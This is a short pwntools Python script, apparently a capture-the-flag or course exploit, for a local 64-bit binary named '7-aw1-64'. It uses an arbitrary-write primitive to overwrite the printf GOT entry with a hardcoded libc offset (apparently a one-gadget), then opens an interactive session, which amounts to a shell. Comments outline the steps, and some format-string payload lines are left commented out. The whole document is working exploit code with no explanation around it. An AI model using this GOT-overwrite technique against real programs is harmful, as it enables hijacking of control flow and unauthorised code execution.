from pwn import *

context.arch = "amd64"

e = ELF("./7-aw1-64")


got_printf = e.got['printf']
printf_offset = int('0x64e40',16) #found using libcdb
#plz_exec_me_addr = e.symbols['please_execute_me']
#log.info(f"this is the address for please_exec_me: {p32(plz_exec_me_addr)}")

#pie_base = int('0x400000', 16)

p = e.process()

print(p.recvline())

p.sendline(b'8')

print(p.recvline())
#payload = fmtstr_payload(5, {e.got['printf'] : lib
p.sendline(hex(got_printf))

print(p.recvline())
#p.interactive()
p.sendline(b'4')
print(p.recvline())
p.sendline(p64(int('0x4f420', 16)))

p.interactive()

#send number of bytes we want to write in dec

#send the address that we want to overwrite

#the data we want the address to be overwriten with
